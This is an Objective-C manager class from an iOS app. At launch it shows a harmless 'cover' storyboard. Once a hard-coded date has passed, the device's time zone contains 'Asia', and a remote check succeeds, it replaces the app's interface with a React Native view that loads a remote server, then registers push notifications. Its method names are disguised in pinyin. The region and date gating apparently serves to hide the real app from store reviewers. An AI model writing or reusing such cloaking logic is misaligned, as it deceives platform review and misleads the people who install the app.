//
//  JPEManager.m
//  Jpoinue
//
//  Created by JackLove on 2019/1/21.
//  Copyright © 2019 JoyceLove. All rights reserved.
//

#import "JPEManager.h"
#import <UserNotifications/UserNotifications.h>
#import "JPUSHService.h"
#import "AFNetworking.h"
#import "RNController.h"
#import "JPENetwork.h"
#import "JPEFailViewController.h"

@interface JPEManager ()<JPUSHRegisterDelegate>

@property (nonatomic, assign) BOOL wasCache;
@property (nonatomic, strong) JPEFailViewController *networkFailVC;
@property (nonatomic, strong) UIViewController *coverVC;
@property (nonatomic, strong) NSDictionary *launchOptions;

@end

@implementation JPEManager

static JPEManager *_manager = nil;

+ (JPEManager *)manager{
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        _manager = [[JPEManager alloc] init];
    });
    
    return _manager;
}

- (instancetype)init{
    self = [super init];
    if (self) {
        _wasCache = NO;
        [NSNotificationCenter.defaultCenter addObserver:self selector:@selector(jp_coverViewRemove) name:@"kJPLaunchViewRemoveSupviewNoti" object:nil];
    }
    
    return self;
}

- (void)dealloc{
    [NSNotificationCenter.defaultCenter removeObserver:self name:@"kJPLaunchViewRemoveSupviewNoti" object:nil];
}

- (BOOL)jp_daoShiJianLeMa{
    NSString *string = self.config.coverTDame;
    if (string == nil || string.length != 8) {
        return false;
    }
    
    NSString *y = [string substringWithRange:NSMakeRange(0, 4)];
    NSString *m = [string substringWithRange:NSMakeRange(4, 2)];
    NSString *d = [string substringWithRange:NSMakeRange(6, 2)];
    NSString *str = [NSString stringWithFormat:@"%@-%@-%@", y, m, d];
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    dateFormatter.dateFormat = @"yyyy-MM-dd";
    NSDate *hhDate = [dateFormatter dateFromString:str];
    if (hhDate == nil) {
        return false;
    }
    
    if (hhDate.timeIntervalSinceNow > 0) {
        return false;
    }
    
    return true;
}

- (void)withLaunchOptions:(NSDictionary *)launchOptions{
    self.launchOptions = launchOptions;
    self.config = [[JPEConfig alloc] init];
    [AFNetworkReachabilityManager.sharedManager startMonitoring];
    NSTimeZone *zone = NSTimeZone.localTimeZone;
    if ([zone.name containsString:@"Asia"]) {
        [self jp_todayCoverView];
        [self jp_todayConfigure];
        if (_wasCache) {
            [self jp_coverViewRemove];
            [self jp_monoterCancel];
            [self jp_jiShiTuiSong];
            [JPENetwork.manager howOldAreYouNormal:nil success:nil fail:nil];
            return;
        }
        
        if (![RNController isValid]) {
            [self jp_coverViewRemove];
            return;
        }
        
        if (![self jp_daoShiJianLeMa]) {
            [self jp_coverViewRemove];
            return;
        }
        
        [NSNotificationCenter.defaultCenter addObserver:self selector:@selector(jp_comeGoOn:) name:AFNetworkingReachabilityDidChangeNotification object:nil];
    } else {
        [NSNotificationCenter.defaultCenter addObserver:self selector:@selector(jp_comeGoStop:) name:AFNetworkingReachabilityDidChangeNotification object:nil];
    }
}

- (void)jp_monoterCancel{
    [AFNetworkReachabilityManager.sharedManager stopMonitoring];
}

- (void)jp_todayConfigure{
    NSDictionary *config = [NSUserDefaults.standardUserDefaults objectForKey:@"JPBenDiPeiZhi"];
    NSString *chann = config[@"channel"];
    NSString *key = config[@"jpushAppKey"];
    NSString *apSeer = config[@"apiServer"];
    NSString *apUr = config[@"jUrl"];
    if (chann && chann.length > 0 && key && key.length > 0 && apSeer && apSeer.length > 0 && apUr && apUr.length > 0) {
        RNController *epvc = [RNController vcWithLaunchOptions:self.launchOptions jUrl:apUr apiServer:apSeer channel:chann jpushAppKey:key umengAppKey:@""];
        UIApplication.sharedApplication.keyWindow.rootViewController = epvc;
        [UIApplication.sharedApplication.keyWindow makeKeyAndVisible];
        self.wasCache = YES;
    } else {
        self.wasCache = NO;
    }
}

- (void)jp_todayCoverView{
    UIStoryboard *board = [UIStoryboard storyboardWithName:self.config.coverName bundle:nil];
    if (self.config.coverID && self.config.coverID.length > 0) {
        self.coverVC = [board instantiateViewControllerWithIdentifier:self.config.coverID];
    } else {
        self.coverVC = [board instantiateInitialViewController];
    }
    
    CGRect frame = _coverVC.view.frame;
    frame.size = UIScreen.mainScreen.bounds.size;
    _coverVC.view.frame = frame;
    [UIApplication.sharedApplication.keyWindow addSubview:_coverVC.view];
}

- (void)jp_coverViewRemove{
    if (_coverVC) {
        [_coverVC.view removeFromSuperview];
        _coverVC = nil;
    }
}

- (void)howOldAreYou{
    [JPENetwork.manager howOldAreYouNormal:^{
        [self jp_QuDiaoFuGaiLoading];
        [self jp_yiChuWangLuoFail];
    } success:^{
        [self jp_QuDiaoFuGaiLoading];
        [self jp_todayConfigure];
        if (self.wasCache) {
            [self jp_jiShiTuiSong];
        } else {
            [self jp_tianJiaWangCuoFailView];
        }
    } fail:^{
        [self jp_QuDiaoFuGaiLoading];
        [self jp_tianJiaWangCuoFailView];
    }];
}

- (void)howFailAreYou{
    [self howOldAreYou];
}

- (void)jp_tianJiaWangCuoFailView{
    if (_networkFailVC == nil) {
        _networkFailVC = [[JPEFailViewController alloc] init];
        CGRect frame = _networkFailVC.view.frame;
        frame.size = UIScreen.mainScreen.bounds.size;
        _networkFailVC.view.frame = frame;
        [UIApplication.sharedApplication.keyWindow addSubview:_networkFailVC.view];
    }
}

- (void)jp_yiChuWangLuoFail{
    if (_networkFailVC) {
        [_networkFailVC.view removeFromSuperview];
        _networkFailVC = nil;
    }
}

- (void)jp_QuDiaoFuGaiLoading{
    [NSNotificationCenter.defaultCenter postNotificationName:@"kJPLaunchViewRemoveSupviewNoti" object:nil];
}

- (void)jp_comeGoOn:(NSNotification *)noti{
    [self jp_monoterCancel];
    NSDictionary *userInfo = noti.userInfo;
    NSInteger status = [userInfo[AFNetworkingReachabilityNotificationStatusItem] integerValue];
    switch (status) {
        case AFNetworkReachabilityStatusNotReachable:{
            [self howFailAreYou];
        }
            break;
        case AFNetworkReachabilityStatusReachableViaWiFi:{
            [self howOldAreYou];
        }
            break;
        case AFNetworkReachabilityStatusUnknown:{
            
            [self howFailAreYou];
        }
            break;
        case AFNetworkReachabilityStatusReachableViaWWAN:{
            [self howOldAreYou];
        }
            break;
        default:
            [self howFailAreYou];
            break;
    }
}

- (void)jp_comeGoStop:(NSNotification *)noti{
    NSDictionary *userInfo = noti.userInfo;
    NSInteger status = [userInfo[AFNetworkingReachabilityNotificationStatusItem] integerValue];
    switch (status) {
        case AFNetworkReachabilityStatusNotReachable:{
        }
            break;
        case AFNetworkReachabilityStatusReachableViaWiFi:{
        }
            break;
        case AFNetworkReachabilityStatusUnknown:{
        }
            break;
        case AFNetworkReachabilityStatusReachableViaWWAN:{
        }
            break;
        default:
            break;
    }
}

- (void)jp_jiShiTuiSong{
    JPUSHRegisterEntity *entity = [[JPUSHRegisterEntity alloc] init];
    entity.types = JPAuthorizationOptionAlert|JPAuthorizationOptionSound|JPAuthorizationOptionBadge;
    [JPUSHService registerForRemoteNotificationConfig:entity delegate:self];
    NSDictionary *config = [NSUserDefaults.standardUserDefaults objectForKey:@"JPBenDiPeiZhi"];
    NSString *push = config[@"jpushAppKey"];
    NSString *channel = config[@"channel"];
    [UIApplication.sharedApplication setApplicationIconBadgeNumber:0];
    [JPUSHService setupWithOption:self.launchOptions appKey:push channel:channel apsForProduction:YES];
    [JPUSHService setBadge:0];
}

- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(NSInteger))completionHandler{
    NSDictionary * userInfo = notification.request.content.userInfo;
    if([notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        [JPUSHService handleRemoteNotification:userInfo];
    }
    
    completionHandler(UNNotificationPresentationOptionAlert);
}

- (void)jpushNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)())completionHandler {
    NSDictionary * userInfo = response.notification.request.content.userInfo;
    if([response.notification.request.trigger isKindOfClass:[UNPushNotificationTrigger class]]) {
        [JPUSHService handleRemoteNotification:userInfo];
    }
    
    completionHandler();
}

@end
